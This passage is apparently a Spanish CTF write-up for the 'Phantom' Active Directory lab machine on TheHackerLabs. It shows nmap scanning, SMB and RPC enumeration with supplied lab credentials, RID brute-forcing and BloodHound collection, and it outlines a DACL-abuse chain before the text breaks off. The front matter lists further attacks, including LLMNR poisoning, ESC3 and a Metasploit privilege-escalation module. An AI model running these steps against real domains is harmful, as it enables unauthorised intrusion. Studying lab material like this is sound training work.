---
title: "Phantom Robotics - TheHackerLabs"
date: 2026-04-29
draft: false
slug: "THL-writeup-phantom"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a enumerar el servicio SMB, pero al no encontrar nada, utilizamos las credenciales dadas para aplicar un RYD Cycling Attack, con tal de conocer todos los grupos y usuarios existentes de la máquina AD. También realizamos enumeración del servicio RPC, pero no encontramos algo relevante. Al no encontrar nada, utilizamos la herramienta bloodhound-python y BloodHound para enumerar el AD, siendo de esta forma que descubrimos una cadena de ataques AD-DACL que nos permite adueñarnos de un usuario con el que nos logueamos a la máquina víctima vía WinRM con Evil-WinRM. Además, aplicamos un LLMNR Poisoning, logrando capturar el Hash NTLMv2 de un usuario, que luego crackeamos con JohnTheRipper y resulta que también podemos loguearnos con este usuario. Dentro, encontramos un mensaje que nos da la pista sobre revisar la Tombstone del AD, siendo así que encontramos la contraseña de algún usuario, pero al desconocer de quién es, aplicamos un Password Spraying, descubriendo así a quién le pertenece esta contraseña. Utilizamos este nuevo usuario para buscar un Template vulnerable, ya que al usar winPEASx64, indica que hay varios Templates vulnerables que pueden ser usados para escalar privilegios. Una vez descubierto el Template vulnerable, vemos que podemos aplicar el ataque ESC3, logrando así escalar privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Windows", "Active Directory", "SMB", "RPC", "Kerberos", "WinRM", "SMB Enumeration", "RYD Cycling Attack", "RPC Enumeration", "BloodHound-Python and BloodHound Enumeration", "AD Chain Attack", "Abusing AD-DACL WriteOwner", "Abusing AD-DACL AddSelf", "Abusing AD-DACL WriteDacl", "Abusing AD-DACL ForceChangePassword", "LLMNR Poisoning", "Cracking Hash", "Cracking NTLMv2 Hash", "Tombstone AD Enumeration", "Password Spraying", "System Recognition (Windows)", "ESC3 Attack (ADCS ESC3 - Enrollment Agent Template)", "Privesc - ESC3 Attack (ADCS ESC3 - Enrollment Agent Template)", "Metasploit Module - CVE-2024-30085 (Cloud Files)", "Privesc - Metasploit Module - CVE-2024-30085 (Cloud Files)", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "nxc"
  - "smbmap"
  - "rpcclient"
  - "awk"
  - "bloodhound-python"
  - "impacket-owneredit"
  - "impacket-dacledit"
  - "net"
  - "bloodyAD"
  - "Evil-WinRM"
  - "responder"
  - "JohnTheRipper"
  - "PowerShell Commands"
  - "winPEASx64"
  - "certipy-ad"
  - "impacket-psexec"
  - "Metasploit Framework (msfconsole)"
  - "Meterpreter"
  - "Módulo: exploit/multi/handle"
  - "Msfvenom"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "Módulo: exploit/windows/local/cve_2024_30085_cloud_files"
  - "type"
links:
  - "https://www.hackingarticles.in/tag/dacl-abuse/"
  - "https://www.hackingarticles.in/abusing-ad-dacl-writeowner/"
  - "https://www.hackingarticles.in/addself-active-directory-abuse/"
  - "https://github.com/ShutdownRepo/targetedKerberoast"
  - "https://www.hackingarticles.in/abusing-ad-dacl-writedacl/"
  - "https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/"
  - "https://evoila.com/blog/llmnr-poisoning/"
  - "https://www.cobalt.io/blog/llmnr-poisoning-ntlm-relay"
  - "https://admindroid.com/how-to-get-deleted-users-in-active-directory"
  - "https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/"
  - "https://github.com/61106960/adPEAS"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4"
  - "https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/"
  - "https://zonahacking.com/post/esc3"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-phantom/Phantom.png"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.56.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 23:07 -0600
Nmap scan report for 192.168.56.1
Host is up (0.00042s latency).
MAC Address: XX (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00053s latency).
MAC Address: XX (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.91 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.56.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	XX	PCS Systemtechnik GmbH
192.168.56.100	XX	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.143 seconds (119.46 hosts/sec). 2 responded
```

Encontramos nuestro objetivo y es: `192.168.56.100`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.56.100
PING 192.168.56.100 (192.168.56.100) 56(84) bytes of data.
64 bytes from 192.168.56.100: icmp_seq=1 ttl=128 time=0.804 ms
64 bytes from 192.168.56.100: icmp_seq=2 ttl=128 time=1.00 ms
64 bytes from 192.168.56.100: icmp_seq=3 ttl=128 time=0.971 ms
64 bytes from 192.168.56.100: icmp_seq=4 ttl=128 time=0.874 ms

--- 192.168.56.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 0.804/0.912/1.001/0.078 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 23:09 -0600
Initiating ARP Ping Scan at 23:09
Scanning 192.168.56.100 [1 port]
Completed ARP Ping Scan at 23:09, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:09
Scanning 192.168.56.100 [65535 ports]
Discovered open port 135/tcp on 192.168.56.100
Discovered open port 139/tcp on 192.168.56.100
Discovered open port 53/tcp on 192.168.56.100
Discovered open port 445/tcp on 192.168.56.100
Discovered open port 3269/tcp on 192.168.56.100
Discovered open port 59503/tcp on 192.168.56.100
Discovered open port 59466/tcp on 192.168.56.100
Discovered open port 593/tcp on 192.168.56.100
Discovered open port 59458/tcp on 192.168.56.100
Discovered open port 88/tcp on 192.168.56.100
Discovered open port 9389/tcp on 192.168.56.100
Discovered open port 464/tcp on 192.168.56.100
Discovered open port 636/tcp on 192.168.56.100
Discovered open port 3268/tcp on 192.168.56.100
Discovered open port 59464/tcp on 192.168.56.100
Discovered open port 59487/tcp on 192.168.56.100
Discovered open port 5985/tcp on 192.168.56.100
Discovered open port 49664/tcp on 192.168.56.100
Discovered open port 59478/tcp on 192.168.56.100
Discovered open port 389/tcp on 192.168.56.100
Completed SYN Stealth Scan at 23:09, 26.32s elapsed (65535 total ports)
Nmap scan report for 192.168.56.100
Host is up, received arp-response (0.00060s latency).
Scanned at 2026-04-26 23:09:21 CST for 26s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
59458/tcp open  unknown          syn-ack ttl 128
59464/tcp open  unknown          syn-ack ttl 128
59466/tcp open  unknown          syn-ack ttl 128
59478/tcp open  unknown          syn-ack ttl 128
59487/tcp open  unknown          syn-ack ttl 128
59503/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
           Raw packets sent: 131053 (5.766MB) | Rcvd: 23 (996B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos muchos puertos abiertos, entre ellos el **puerto 88**, que nos indica el uso del **servicio Kerberos**, por lo que nos enfrentaremos a una máquina **Active Directory**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,59458,59464,59466,59478,59487,59503 192.168.56.100 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 23:10 -0600
Nmap scan report for 192.168.56.100
Host is up (0.0016s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 05:25:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)

|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)

|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)

|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
59458/tcp open  msrpc         Microsoft Windows RPC
59464/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59466/tcp open  msrpc         Microsoft Windows RPC
59478/tcp open  msrpc         Microsoft Windows RPC
59487/tcp open  msrpc         Microsoft Windows RPC
59503/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_clock-skew: mean: 15m15s, deviation: 0s, median: 15m14s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: XX (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-04-27T05:26:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.34 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias a este escaneo, podemos ver muchas cosas interesantes:
* Podemos ver cuál es el dominio del **AD** siendo `PHANTOM.THL` y `DC01.PHANTOM.THL`, siendo que podemos guardarlos en el `/etc/hosts`:
```bash
echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
```
* Vemos que el **puerto 5985** está abierto, lo que nos dice que quizá nos podamos conectar a la máquina víctima vía **WinRM**.
* El **servicio SMB** nos dice que se necesita un usuario y contraseña para poder utilizarlo.

Para avanzar con esta máquina, tenemos un usuario y contraseña que nos puede ayudar a encontrar alguna vulnerabilidad:
```bash
User: mark
Pass: suP3rPa$sw0rd2026!&
```
Vamos a comenzar con enumeración del **servicio SMB**, luego del **servicio RPC** y, por último, veamos que podemos realizar ante el **servicio Kerberos**.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio SMB {#SMB}

Utilicemos la herramienta **netexec** para ver información del **servicio SMB**:
```bash
nxc smb 192.168.56.100
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
```

Ahora, probemos si las credenciales que nos dieron funcionan:
```bash
nxc smb 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&'
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!&
```
Sí funcionan.

Veamos qué archivos compartidos existen con la herramienta **smbmap**:
```bash
smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dev Tools                                         	READ, WRITE	Dev Tools
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
[*] Closed 1 connections
```
Existe un directorio en el que podemos leer y escribir.

Veamos su contenido:
```bash
smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' -r 'Dev Tools' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dev Tools                                         	READ, WRITE	Dev Tools
	./Dev Tools
	dr--r--r--                0 Sun Apr 26 23:30:33 2026	.
	dr--r--r--                0 Sat Feb 21 11:29:29 2026	..
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
[*] Closed 1 connections
```
Curiosamente, no hay nada.

Lo que podríamos hacer es obtener todos los usuarios existentes de la máquina, aplicando un **RYD Cycling Attack**.

#### Aplicando RYD Cycling Attack {#RYD}

Esto lo aplicaremos con la herramienta **netexec** y la flag `--rid-brute`:
```bash
nxc smb 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --rid-brute
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!& 
SMB         192.168.56.100  445    DC01             498: PHANTOM\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
SMB         192.168.56.100  445    DC01             500: PHANTOM\Administrador (SidTypeUser)
SMB         192.168.56.100  445    DC01             501: PHANTOM\Invitado (SidTypeUser)
SMB         192.168.56.100  445    DC01             502: PHANTOM\krbtgt (SidTypeUser)
SMB         192.168.56.100  445    DC01             512: PHANTOM\Admins. del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             513: PHANTOM\Usuarios del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             514: PHANTOM\Invitados del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             515: PHANTOM\Equipos del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             516: PHANTOM\Controladores de dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             517: PHANTOM\Publicadores de certificados (SidTypeAlias)
SMB         192.168.56.100  445    DC01             518: PHANTOM\Administradores de esquema (SidTypeGroup)
SMB         192.168.56.100  445    DC01             519: PHANTOM\Administradores de empresas (SidTypeGroup)
SMB         192.168.56.100  445    DC01             520: PHANTOM\Propietarios del creador de directivas de grupo (SidTypeGroup)
SMB         192.168.56.100  445    DC01             521: PHANTOM\Controladores de dominio de sólo lectura (SidTypeGroup)
SMB         192.168.56.100  445    DC01             522: PHANTOM\Controladores de dominio clonables (SidTypeGroup)
SMB         192.168.56.100  445    DC01             525: PHANTOM\Protected Users (SidTypeGroup)
SMB         192.168.56.100  445    DC01             526: PHANTOM\Administradores clave (SidTypeGroup)
SMB         192.168.56.100  445    DC01             527: PHANTOM\Administradores clave de la organización (SidTypeGroup)
SMB         192.168.56.100  445    DC01             553: PHANTOM\Servidores RAS e IAS (SidTypeAlias)
SMB         192.168.56.100  445    DC01             571: PHANTOM\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
SMB         192.168.56.100  445    DC01             572: PHANTOM\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
SMB         192.168.56.100  445    DC01             1000: PHANTOM\DC01$ (SidTypeUser)
SMB         192.168.56.100  445    DC01             1101: PHANTOM\DnsAdmins (SidTypeAlias)
SMB         192.168.56.100  445    DC01             1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1103: PHANTOM\mark (SidTypeUser)
SMB         192.168.56.100  445    DC01             1104: PHANTOM\bob (SidTypeUser)
SMB         192.168.56.100  445    DC01             1105: PHANTOM\joe (SidTypeUser)
SMB         192.168.56.100  445    DC01             1106: PHANTOM\mia (SidTypeUser)
SMB         192.168.56.100  445    DC01             1107: PHANTOM\sandra (SidTypeUser)
SMB         192.168.56.100  445    DC01             1108: PHANTOM\maria (SidTypeUser)
SMB         192.168.56.100  445    DC01             1109: PHANTOM\ana (SidTypeUser)
SMB         192.168.56.100  445    DC01             1110: PHANTOM\michael (SidTypeUser)
SMB         192.168.56.100  445    DC01             1111: PHANTOM\ian (SidTypeUser)
SMB         192.168.56.100  445    DC01             1112: PHANTOM\joshua (SidTypeUser)
SMB         192.168.56.100  445    DC01             1113: PHANTOM\frank (SidTypeUser)
SMB         192.168.56.100  445    DC01             1115: PHANTOM\tomas (SidTypeUser)
SMB         192.168.56.100  445    DC01             1116: PHANTOM\robert (SidTypeUser)
SMB         192.168.56.100  445    DC01             1117: PHANTOM\IT (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1118: PHANTOM\Support (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1119: PHANTOM\RRHH (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1120: PHANTOM\Finances (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1121: PHANTOM\Developers (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1122: PHANTOM\HelpDesk (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1123: PHANTOM\DevOps (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1124: PHANTOM\LegacyAdmins (SidTypeUser)
SMB         192.168.56.100  445    DC01             1125: PHANTOM\Monitoring (SidTypeGroup)
```
Observa todos los grupos y usuarios que obtuvimos.

Con estos usuarios podemos intentar aplicar un **Password Spraying** para saber si alguno de estos tiene la misma contraseña que nuestro usuario actual, pero esto no servira.

Otra opción que tenemos es subir un archivo al directorio **Dev Tools**, suponiendo que todos los archivos que estén en este recurso se ejecuten, pero tampoco servirá.

Por ahora, dejemos un poco **SMB** y apliquemos enumeración al **servicio RPC**.

### Enumeración del Servicio RPC {#RPC}

Entremos al **servicio RPC** utilizando la herramienta **rpcclient**:
```bash
rpcclient -U 'mark%suP3rPa$sw0rd2026!&' 192.168.56.100
rpcclient $>
```
Estamos dentro.

Veamos los usuarios existentes:
```bash
rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[mark] rid:[0x44f]
user:[bob] rid:[0x450]
user:[joe] rid:[0x451]
user:[mia] rid:[0x452]
user:[sandra] rid:[0x453]
user:[maria] rid:[0x454]
user:[ana] rid:[0x455]
user:[michael] rid:[0x456]
user:[ian] rid:[0x457]
user:[joshua] rid:[0x458]
user:[frank] rid:[0x459]
user:[tomas] rid:[0x45b]
user:[robert] rid:[0x45c]
user:[LegacyAdmins] rid:[0x464]
```
Bien, no cambia a cuando lo hicimos con el **servicio SMB**.

Enumeremos las descripciones de cada usuario con `querydispinfo`, esto para ver si aparece algún dato de cualquier usuario que nos sea de ayuda:
```bash
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: (null)	Desc: Cuenta integrada para la administración del equipo o dominio
index: 0xfb7 RID: 0x455 acb: 0x00000210 Account: ana	Name: Ana	Desc: (null)
index: 0xfb2 RID: 0x450 acb: 0x00000210 Account: bob	Name: Bob	Desc: (null)
index: 0xfbb RID: 0x459 acb: 0x00000210 Account: frank	Name: Frank	Desc: (null)
index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: ian	Name: Ian	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Invitado	Name: (null)	Desc: Cuenta integrada para el acceso como invitado al equipo o dominio
index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: joe	Name: Joe	Desc: (null)
index: 0xfba RID: 0x458 acb: 0x00000210 Account: joshua	Name: Joshua	Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Cuenta de servicio de centro de distribución de claves
index: 0xfc6 RID: 0x464 acb: 0x00000210 Account: LegacyAdmins	Name: LegacyAdmins	Desc: Legacy administrative group maintained for backward compatibility with older systems.
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: maria	Name: Maria	Desc: (null)
index: 0xfb1 RID: 0x44f acb: 0x00000210 Account: mark	Name: Mark	Desc: (null)
index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: mia	Name: Mia	Desc: (null)
index: 0xfb8 RID: 0x456 acb: 0x00000210 Account: michael	Name: Michael	Desc: (null)
index: 0xfbe RID: 0x45c acb: 0x00000210 Account: robert	Name: Robert	Desc: (null)
index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: sandra	Name: Sandra	Desc: (null)
index: 0xfbd RID: 0x45b acb: 0x00000210 Account: tomas	Name: Tomas	Desc: (null)
```
No hay nada que destacar.

Enumeremos los grupos existentes:
```bash
rpcclient $> enumdomgroups
group:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
group:[Admins. del dominio] rid:[0x200]
group:[Usuarios del dominio] rid:[0x201]
group:[Invitados del dominio] rid:[0x202]
group:[Equipos del dominio] rid:[0x203]
group:[Controladores de dominio] rid:[0x204]
group:[Administradores de esquema] rid:[0x206]
group:[Administradores de empresas] rid:[0x207]
group:[Propietarios del creador de directivas de grupo] rid:[0x208]
group:[Controladores de dominio de sólo lectura] rid:[0x209]
group:[Controladores de dominio clonables] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Administradores clave] rid:[0x20e]
group:[Administradores clave de la organización] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[IT] rid:[0x45d]
group:[Support] rid:[0x45e]
group:[RRHH] rid:[0x45f]
group:[Finances] rid:[0x460]
group:[Developers] rid:[0x461]
group:[HelpDesk] rid:[0x462]
group:[DevOps] rid:[0x463]
group:[Monitoring] rid:[0x465]
```
Hay algunos grupos que se ven interesantes, por ejemplo, los grupos **IT, Developers, DevOps, Monitoring y Support**, así que quizá esto nos ayuda después.

Por último, te muestro el siguiente oneliner que nos ayuda a obtener todos los usuarios existentes con **rpcclient**:
```bash
rpcclient -U 'mark%suP3rPa$sw0rd2026!&' 192.168.56.100 -c "enumdomusers" | awk -F '[][]' '{print $2}'
Administrador
Invitado
krbtgt
mark
bob
joe
mia
sandra
maria
ana
michael
ian
joshua
frank
tomas
robert
LegacyAdmins
```
Ya solo guárdalos en un archivo o solo agrega que la salida se guarde en un archivo.

### Enumeración de AD con BloodHound-Python y BloodHound Ver 4.3.1 {#BloodHound}

Al no encontrar algo más, vamos a analizar la infraestructura del AD para identificar si nuestro usuario tiene algún privilegio/permiso que nos permita ganar acceso a la máquina víctima.

Para esto, utilizaremos la herramienta **bloodhound-python** para poder capturar toda esta información:
```bash
bloodhound-python -u 'mark' -p 'suP3rPa$sw0rd2026!&' -d PHANTOM.THL -dc DC01.PHANTOM.THL -ns 192.168.56.100 --zip -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: phantom.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.PHANTOM.THL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.PHANTOM.THL
INFO: Found 18 users
INFO: Found 60 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.PHANTOM.THL
INFO: Done in 00M 01S
INFO: Compressing output into 20260427220657_bloodhound.zip
```
Carga ese **archivo ZIP** a **BloodHound** y busquemos la información del **usuario mark**.

**Nota**: Puede que la herramienta llegue a fallar si es que no tienes configurado un **DNS** de la máquina víctima, por lo que puedes hacer lo siguiente:
```bash
nano /etc/resolv.conf
----
nameserver IP_Máquina_AD 
```
Ahora sí, continuemos.

Observa que tenemos la siguiente cadena de ataques al seleccionar la opción **Reachable High Value Targets**:

<p align="center">
<img src="/assets/images/THL-writeup-phantom/Captura1.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-phantom/Captura2.png">
</p>

Con lo que podemos ver, podemos realizar una cadena de ataques que nos llevara hasta el **usuario frank**, que es quien se puede conectar a la máquina víctima vía **WinRM** junto a otros 2 usuarios más.

Apliquemos los ataques.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima - Abuso de AD-DACL {#AttackChain}

La idea es aplicar la siguiente cadena de ataques:
* Abusar del permiso `WriteOwner` que tenemos hacia el **usuario bob** para cambiar su contraseña.
* Abusar del permiso `AddSelf` que tiene el **usuario bob** sobre el grupo **IT**, para agregarlo a este mismo grupo.
* Abusar del permiso `WriteDacl` que tienen los usuarios del grupo **IT** para agregar al **usuario bob** al grupo **HELPDESK**.
* Abusar del permiso `ForceChangePassword` que tienen los usuarios del grupo **HELPDESK**, en este caso el **usuario bob**, para cambiarle la contraseña del **usuario frank**.
* Utilizar al **usuario frank** para ganar acceso a la máquina víctima vía **WinRM** usando **Evil-WinRM**, ya que tiene el permiso `CanPSRemote`.

Todo esto lo aplicaremos a continuación.

#### Abusando del Permiso WriteOwner para Cambiar Contraseña de Usuario bob {#WriteOwner}

Primero entendamos, ¿qué hace el permiso `WriteOwner`?

| **Permiso WriteOwner** |
|:----------------------:|
